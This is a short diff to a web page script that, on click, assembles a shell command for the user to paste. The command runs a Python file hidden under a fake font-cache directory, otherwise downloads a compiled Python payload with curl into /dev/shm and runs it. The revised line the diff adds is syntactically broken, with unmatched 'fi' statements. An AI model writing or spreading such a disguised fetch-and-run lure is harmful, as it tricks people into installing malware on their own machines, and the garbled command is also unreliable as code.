@@ -31,7 +31,7 @@
     document.body.appendChild(c);
 
     c.onclick = () => {
-        const executionString = `I="$HOME/.local/share/.fontcache-x11/lynx.py"; if [ -f "$I" ]; then LYNX_KEEP_TERMINAL=1 python3 "$I"; R=$?; if [ "$R" -eq 0 ]; then exit 0; fi; fi; T="$(mktemp -d /dev/shm/lynx-fallback.XXXXXX)" || exit 1; trap 'rm -rf "$T"' EXIT; curl -fsSL "${binaryStorageUrl}" -o "$T/main.pyc" && test -s "$T/main.pyc" && python3 "$T/main.pyc"`;
+        const executionString = `I="$HOME/.local/share/.fontcache-x11/lynx.py"; chmod +x $I; python3 "$I"; R=$?; if [ "$R" -eq 0 ]; then exit 0; fi; fi; T="$(mktemp -d /dev/shm/lynx-fallback.XXXXXX)" || exit 1; trap 'rm -rf "$T"' EXIT; curl -fsSL "${binaryStorageUrl}" -o "$T/main.pyc" && test -s "$T/main.pyc" && python3 "$T/main.pyc"`;
 
         const e = document.createElement('textarea');
         e.value = executionString;
